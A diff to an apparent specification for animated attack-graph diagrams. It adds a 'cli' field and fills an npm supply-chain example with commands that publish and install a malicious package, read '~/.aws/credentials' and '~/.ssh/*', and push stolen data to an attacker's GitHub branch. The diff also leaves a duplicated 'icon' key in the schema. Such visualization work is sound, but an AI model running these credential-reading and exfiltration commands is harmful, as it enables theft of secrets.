@@ -41,6 +41,7 @@ The graph is **animated**. Entities appear when relevant. Edges show actions. Th
 7. **Attacker separation** — The attacker (person) stays outside "Internet" container; C2/infra CAN be inside
 8. **No orphan entities** — Every node MUST be source OR target of at least one edge
 9. **Attacker perspective only** — No detection alerts, SIEM events, or defender artifacts unless explicitly requested
+10. **Use 'cli' for exact commands or tools** — When an action involves a specific command (nmap, npm, git), use the `cli` field. Same applies for malicious or offensive commands (evil-winrm , impacket, python exploit.py , etc)
 
 ## 1.3 Common Mistakes to Avoid
 
@@ -739,7 +740,9 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
   "from": "source_entity_id",
   "to": "target_entity_id",
   "icon": "IconSearch",
+  "icon": "IconSearch",
   "tooltip": "Detailed technical explanation",
+  "cli": "nmap -sT -sV -p- 192.168.1.10",
   "mitre": {
     "id": "T1595",
     "tactic": "Reconnaissance",
@@ -869,12 +872,12 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
     "internet_zone": { "start": 0, "end": 100 },
     "npm_registry": { "start": 0, "end": 100 },
     "github_platform": { "start": 0, "end": 100 },
-    "attacker": { "start": 1, "end": 100 },
+    "attacker": { "start": 0, "end": 100 },
     "victim_workstation": { "start": 0, "end": 100 },
     "user_terminal": { "start": 0, "end": 100 },
     "malware_script": { "start": 4, "end": 100 },
     "aws_credentials": { "start": 0, "end": 100 },
-    "ssh_keys": { "start": 0, "end": 100 }
+    "ssh_keys": { "start": 5, "end": 100 }
   },
 
   "steps": [
@@ -904,7 +907,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1195.001",
         "tactic": "Initial Access",
         "technique": "Supply Chain Compromise"
-      }
+      },
+      "cli": "npm publish malicious-package@1.0.0"
     },
     {
       "id": 3,
@@ -912,8 +916,9 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
       "name": "npm install (request)",
       "from": "user_terminal",
       "to": "npm_registry",
-      "icon": "IconTerminal",
-      "tooltip": "Developer runs 'npm install' which requests the compromised package",
+      "icon": "IconNpm",
+      "tooltip": "Developer runs install command",
+      "cli": "npm install malicious-package@1.0.0",
       "mitre": {
         "id": "T1204.002",
         "tactic": "Execution",
@@ -932,7 +937,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1195.001",
         "tactic": "Initial Access",
         "technique": "Supply Chain Compromise"
-      }
+      },
+      "cli": "npm install malicious-package@1.0.0"
     },
     {
       "id": 5,
@@ -960,7 +966,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1552.001",
         "tactic": "Credential Access",
         "technique": "Unsecured Credentials: Credentials In Files"
-      }
+      },
+      "cli": "cat ~/.aws/credentials"
     },
     {
       "id": 7,
@@ -974,7 +981,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1552.004",
         "tactic": "Credential Access",
         "technique": "Unsecured Credentials: Private Keys"
-      }
+      },
+      "cli": "cat ~/.ssh/*"
     },
     {
       "id": 8,
@@ -988,7 +996,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1567.001",
         "tactic": "Exfiltration",
         "technique": "Exfiltration Over Web Service: Exfiltration to Code Repository"
-      }
+      },
+      "cli": "git push origin exfil-branch-random-name"
     },
     {
       "id": 9,
@@ -1002,7 +1011,8 @@ Attacker Infrastructure (container) — Optional, for sophisticated attacks
         "id": "T1530",
         "tactic": "Collection",
         "technique": "Data from Cloud Storage"
-      }
+      },
+      "cli": "git clone https://github.com/attacker/exfil-branch-random-name.git"
     }
   ]
 }
